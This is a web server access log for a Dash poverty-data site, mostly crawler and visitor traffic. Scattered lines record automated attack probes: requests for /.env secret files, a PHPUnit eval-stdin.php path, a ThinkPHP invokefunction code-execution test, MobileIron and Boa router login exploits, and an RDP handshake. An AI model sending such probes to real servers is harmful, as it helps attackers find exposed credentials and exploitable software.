194.48.199.78 - - [17/Nov/2021:14:07:05 +0000] "GET /servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet HTTP/1.1" 200 13270 "-" "curl/7.64.1"
178.62.59.163 - - [17/Nov/2021:14:10:14 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.62.59.163 - - [17/Nov/2021:14:10:14 +0000] "POST / HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.148.29 - - [17/Nov/2021:14:29:31 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-component-suites/dash_renderer/prop-types@15.v1_9_0m1611082192.7.2.min.js HTTP/1.1" 200 832 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-component-suites/dash_renderer/react@16.v1_9_0m1611082192.14.0.min.js HTTP/1.1" 200 4898 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-component-suites/dash_table/bundle.v4_11_2m1611087174.js HTTP/1.1" 200 11013 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-component-suites/dash_renderer/polyfill@7.v1_9_0m1611082192.8.7.min.js HTTP/1.1" 200 34243 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-component-suites/dash_core_components/dash_core_components-shared.v1_15_0m1611086582.js HTTP/1.1" 200 9685 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-component-suites/dash_renderer/react-dom@16.v1_9_0m1611082192.14.0.min.js HTTP/1.1" 200 38049 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-component-suites/dash_bootstrap_components/_components/dash_bootstrap_components.v0_11_3m1618740747.min.js HTTP/1.1" 200 54303 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-component-suites/dash_html_components/dash_html_components.v1_1_2m1611087126.min.js HTTP/1.1" 200 18907 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-component-suites/dash_renderer/dash_renderer.v1_9_0m1611082209.min.js HTTP/1.1" 200 59217 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-component-suites/dash_core_components/dash_core_components.v1_15_0m1611086582.min.js HTTP/1.1" 200 118829 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-dependencies HTTP/1.1" 200 430 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "GET /_dash-layout HTTP/1.1" 200 2416 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:31 +0000] "POST /_dash-update-component HTTP/1.1" 200 7106 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "GET /_dash-component-suites/dash_core_components/async-graph.v1_15_0m1611086576.js HTTP/1.1" 200 5332 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "GET /_dash-component-suites/dash_core_components/async-dropdown.v1_15_0m1611086576.js HTTP/1.1" 200 30740 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "GET /_dash-component-suites/dash_core_components/async-slider.v1_15_0m1611086576.js HTTP/1.1" 200 28563 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "GET /_dash-component-suites/dash_core_components/async-markdown.v1_15_0m1611086576.js HTTP/1.1" 200 59335 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "POST /_dash-update-component HTTP/1.1" 200 3569 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "POST /_dash-update-component HTTP/1.1" 200 3623 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "GET /_dash-component-suites/dash_core_components/async-highlight.v1_15_0m1611086576.js HTTP/1.1" 200 22977 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "GET /_dash-component-suites/dash_table/async-table.v4_11_2m1611087157.js HTTP/1.1" 200 92275 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "POST /_dash-update-component HTTP/1.1" 200 2054 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:32 +0000] "GET /_dash-component-suites/dash_core_components/async-plotlyjs.v1_15_0m1611086576.js HTTP/1.1" 200 1034213 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:14:29:33 +0000] "POST /_dash-update-component HTTP/1.1" 200 43039 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
45.146.164.110 - - [17/Nov/2021:14:43:00 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
157.55.39.68 - - [17/Nov/2021:14:57:31 +0000] "GET /sitemap_index.xml HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
34.244.200.232 - - [17/Nov/2021:14:59:35 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84"
34.244.200.232 - - [17/Nov/2021:14:59:35 +0000] "GET /_favicon.ico?v=1.19.0 HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84"
34.244.200.232 - - [17/Nov/2021:14:59:35 +0000] "GET /favicon.ico HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84"
45.146.164.110 - - [17/Nov/2021:15:08:04 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
69.203.147.238 - - [17/Nov/2021:15:27:37 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
71.6.232.4 - - [17/Nov/2021:15:30:54 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
157.55.39.68 - - [17/Nov/2021:15:41:56 +0000] "GET /sitemap_index.xml HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.83.36.32 - - [17/Nov/2021:15:42:45 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
106.75.164.154 - - [17/Nov/2021:15:48:48 +0000] "GET / HTTP/1.0" 200 98134 "-" "-"
64.227.97.195 - - [17/Nov/2021:16:01:37 +0000] "\x00\x0E8\x09\x1A*@gFC\xA8\x00\x00\x00\x00\x00" 400 166 "-" "-"
87.251.155.206 - - [17/Nov/2021:16:07:01 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.146.164.110 - - [17/Nov/2021:16:14:49 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.149.237 - - [17/Nov/2021:16:17:24 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
172.104.51.254 - - [17/Nov/2021:16:37:38 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.51.254 - - [17/Nov/2021:16:37:38 +0000] "POST / HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.51.254 - - [17/Nov/2021:16:37:39 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.51.254 - - [17/Nov/2021:16:37:40 +0000] "POST / HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.57.122.88 - - [17/Nov/2021:16:40:56 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
2.57.122.88 - - [17/Nov/2021:16:40:56 +0000] "GET /_favicon.ico?v=1.19.0 HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
2.57.122.88 - - [17/Nov/2021:16:40:56 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
2.57.122.88 - - [17/Nov/2021:16:40:56 +0000] "GET /_favicon.ico?v=1.19.0 HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
170.130.187.34 - - [17/Nov/2021:16:48:55 +0000] "GET / HTTP/1.0" 200 144683 "-" "https://gdnplus.com:Gather Analyze Provide."
47.242.190.193 - - [17/Nov/2021:16:53:37 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
180.149.125.173 - - [17/Nov/2021:16:56:37 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
45.61.186.13 - - [17/Nov/2021:17:05:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://172.104.245.213:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.61.186.13 - - [17/Nov/2021:17:05:30 +0000] "" 400 0 "-" "-"
45.146.164.110 - - [17/Nov/2021:17:08:04 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
18.118.121.13 - - [17/Nov/2021:17:11:03 +0000] "GET /explore HTTP/1.1" 200 144683 "-" "-"
209.141.56.209 - - [17/Nov/2021:17:17:46 +0000] "GET / HTTP/1.1" 200 13270 "-" "Linux Gnu (cow)"
216.251.130.74 - - [17/Nov/2021:17:22:35 +0000] "GET /aaa9 HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
45.146.164.110 - - [17/Nov/2021:17:47:21 +0000] "POST /mifs/.;/services/LogService HTTP/1.1" 405 178 "https://172.104.245.213:443" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.64.226 - - [17/Nov/2021:17:56:28 +0000] "GET /Haiti HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
100.21.218.158 - - [17/Nov/2021:18:08:13 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
94.200.35.174 - - [17/Nov/2021:18:12:21 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
94.200.35.174 - - [17/Nov/2021:18:12:21 +0000] "GET /_dash-component-suites/dash_renderer/polyfill@7.v1_9_0m1611082192.8.7.min.js HTTP/1.1" 200 34243 "https://povertydata.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
94.200.35.174 - - [17/Nov/2021:18:12:21 +0000] "GET /_dash-component-suites/dash_renderer/react@16.v1_9_0m1611082192.14.0.min.js HTTP/1.1" 200 4898 "https://povertydata.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
94.200.35.174 - - [17/Nov/2021:18:12:21 +0000] "GET /_dash-component-suites/dash_renderer/react-dom@16.v1_9_0m1611082192.14.0.min.js HTTP/1.1" 200 38049 "https://povertydata.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
94.200.35.174 - - [17/Nov/2021:18:12:21 +0000] "GET /_dash-component-suites/dash_table/bundle.v4_11_2m1611087174.js HTTP/1.1" 200 11013 "https://povertydata.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
94.200.35.174 - - [17/Nov/2021:18:12:21 +0000] "GET /_dash-component-suites/dash_bootstrap_components/_components/dash_bootstrap_components.v0_11_3m1618740747.min.js HTTP/1.1" 200 54303 "https://povertydata.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
94.200.35.174 - - [17/Nov/2021:18:12:21 +0000] "GET /_dash-component-suites/dash_core_components/dash_core_components-shared.v1_15_0m1611086582.js HTTP/1.1" 200 9685 "https://povertydata.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
94.200.35.174 - - [17/Nov/2021:18:12:22 +0000] "GET /_dash-component-suites/dash_html_components/dash_html_components.v1_1_2m1611087126.min.js HTTP/1.1" 200 18907 "https://povertydata.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
94.200.35.174 - - [17/Nov/2021:18:12:22 +0000] "GET /_dash-component-suites/dash_core_components/dash_core_components.v1_15_0m1611086582.min.js HTTP/1.1" 200 118829 "https://povertydata.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
94.200.35.174 - - [17/Nov/2021:18:12:22 +0000] "GET /_dash-component-suites/dash_renderer/dash_renderer.v1_9_0m1611082209.min.js HTTP/1.1" 200 59217 "https://povertydata.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
157.55.39.72 - - [17/Nov/2021:18:31:45 +0000] "GET /atom.xml HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.103 - - [17/Nov/2021:18:31:52 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.138 - - [17/Nov/2021:18:31:58 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.64.167 - - [17/Nov/2021:18:41:28 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.167 - - [17/Nov/2021:18:41:28 +0000] "GET /Eritrea HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
20.55.53.144 - - [17/Nov/2021:18:51:42 +0000] "GET /UiDsu2rm7xBXOHLfvpNGCPz3dy7 HTTP/1.1" 400 666 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
20.55.53.144 - - [17/Nov/2021:18:51:44 +0000] "GET /UiDsu2rm7xBXOHLfvpNGCPz3dy7 HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
45.146.164.110 - - [17/Nov/2021:19:02:01 +0000] "GET /console/ HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.64.169 - - [17/Nov/2021:19:16:44 +0000] "GET /_dash-component-suites/dash_core_components/dash_core_components-shared.v1_15_0m1611086582.js HTTP/1.1" 200 9685 "http://172.104.245.213/Eritrea" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.169 - - [17/Nov/2021:19:16:45 +0000] "GET /_dash-component-suites/dash_renderer/prop-types@15.v1_9_0m1611082192.7.2.min.js HTTP/1.1" 200 832 "http://172.104.245.213/Eritrea" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.169 - - [17/Nov/2021:19:16:45 +0000] "GET /_dash-component-suites/dash_html_components/dash_html_components.v1_1_2m1611087126.min.js HTTP/1.1" 200 18907 "http://172.104.245.213/Eritrea" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.169 - - [17/Nov/2021:19:16:46 +0000] "GET /_dash-component-suites/dash_core_components/dash_core_components.v1_15_0m1611086582.min.js HTTP/1.1" 200 118829 "http://172.104.245.213/Eritrea" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.169 - - [17/Nov/2021:19:16:46 +0000] "GET /_dash-component-suites/dash_bootstrap_components/_components/dash_bootstrap_components.v0_11_3m1618740747.min.js HTTP/1.1" 200 54303 "http://172.104.245.213/Eritrea" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.167 - - [17/Nov/2021:19:16:47 +0000] "GET /_dash-component-suites/dash_table/bundle.v4_11_2m1611087174.js HTTP/1.1" 200 11013 "http://172.104.245.213/Eritrea" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.169 - - [17/Nov/2021:19:16:47 +0000] "GET /_dash-component-suites/dash_renderer/polyfill@7.v1_9_0m1611082192.8.7.min.js HTTP/1.1" 200 34243 "http://172.104.245.213/Eritrea" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.167 - - [17/Nov/2021:19:16:47 +0000] "GET /_dash-component-suites/dash_renderer/dash_renderer.v1_9_0m1611082209.min.js HTTP/1.1" 200 59217 "http://172.104.245.213/Eritrea" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.189.230.128 - - [17/Nov/2021:19:25:09 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
54.189.230.128 - - [17/Nov/2021:19:25:10 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
54.189.230.128 - - [17/Nov/2021:19:25:10 +0000] "GET //_favicon.ico?v=1.19.0 HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
45.146.164.110 - - [17/Nov/2021:19:26:18 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.64.226 - - [17/Nov/2021:19:26:28 +0000] "GET /Honduras HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.186.47.240 - - [17/Nov/2021:19:26:32 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
66.249.64.251 - - [17/Nov/2021:19:27:03 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Haiti" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.226 - - [17/Nov/2021:19:27:04 +0000] "POST /_dash-update-component HTTP/1.1" 200 83 "https://povertydata.org/Haiti" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:19:27:05 +0000] "POST /_dash-update-component HTTP/1.1" 200 2717 "https://povertydata.org/Haiti" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.212.97.6 - - [17/Nov/2021:19:28:31 +0000] "GET /favicon.ico HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.186.47.240 - - [17/Nov/2021:19:28:58 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.219.125.153 - - [17/Nov/2021:19:29:44 +0000] "GET /favicon.ico HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
157.55.39.121 - - [17/Nov/2021:19:30:01 +0000] "GET /sitemap.xml.gz HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
192.241.198.82 - - [17/Nov/2021:19:39:41 +0000] "GET /portal/redlion HTTP/1.1" 200 13270 "-" "Mozilla/5.0 zgrab/0.x"
114.119.144.17 - - [17/Nov/2021:19:42:00 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
52.183.77.207 - - [17/Nov/2021:20:00:06 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.183.77.207 - - [17/Nov/2021:20:00:31 +0000] "POST / HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
5.8.10.202 - - [17/Nov/2021:20:06:38 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
